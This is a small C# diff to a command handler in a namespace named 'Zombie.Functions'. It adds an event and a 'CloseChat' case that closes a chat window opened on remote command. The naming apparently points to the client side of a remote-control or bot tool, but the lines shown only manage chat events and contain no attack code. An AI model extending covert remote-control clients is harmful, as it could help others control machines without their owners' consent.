@@ -18,6 +18,7 @@ namespace Zombie.Functions
     {
 
         public static event EventHandler MessageReceived;
+        public static event EventHandler ChatCloseRequest;
         public static void Process(CommandFlags flag, BinaryReader reader)
         {
             switch (flag)
@@ -59,6 +60,9 @@ namespace Zombie.Functions
                         ZombieForm.Form.Invoke(new MethodInvoker(() => { new ChatForm(id).Show(); }));
                         MessageReceived?.Invoke(null, new MessageArgs(text));
                     }
+                    break;
+                case CommandFlags.CloseChat:
+                    ChatCloseRequest?.Invoke(null, EventArgs.Empty);
                     break;
 
             }
